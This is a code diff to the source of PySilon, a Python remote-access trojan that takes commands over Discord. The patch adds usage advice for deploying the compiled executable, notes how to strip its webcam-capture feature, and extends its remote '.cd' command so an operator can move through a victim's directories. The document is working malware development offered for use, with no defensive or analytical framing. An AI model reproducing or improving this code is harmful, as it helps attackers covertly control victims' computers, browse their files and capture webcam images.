@@ -35,7 +35,8 @@ import os
 #    2. Don't insert or remove any line of code in this script, because that will produce errors in compiler.py
 #    3. Before you run this code or compile it or send to someone, read the Disclaimer (Line-65) carefully.
 #    4. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
-#  
+#    5. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
+#       If there would be any errors (probably wont but it's still freaking Windows), I could fix them for you.
 #
 #    HOW TO COMPILE:
 #
@@ -46,11 +47,10 @@ import os
 #    python compiler.py
 #
 #
+#    IF YOU WANT TO HAVE LESS SIZE OF COMPILED EXECUTABLE RATHER THAN FEATURE OF CAPTURING WEBCAM IMAGES:
 #
-#
-#
-#
-#
+#    1. Delete the import of 'cv2' module (1st line), but leave this line empty, don't fully remove it.
+#    2. Delete the '.webcam' command from 'on_message' function (lines 691-703)
 #
 #
 #
@@ -393,10 +393,13 @@ async def on_message(message):
                         reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
                     else:
                         if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
-                            if message.content[4:] == '..':
-                                working_directory.pop(-1)
+                            if '/' in message.content:
+                                for dir in message.content[4:].split('/'):
+                                    if dir == '..': working_directory.pop(-1)
+                                    else: working_directory.append(dir)
                             else:
-                                working_directory.append(message.content[4:])
+                                if message.content[4:] == '..': working_directory.pop(-1)
+                                else: working_directory.append(message.content[4:])
                             reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                         else:
                             reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
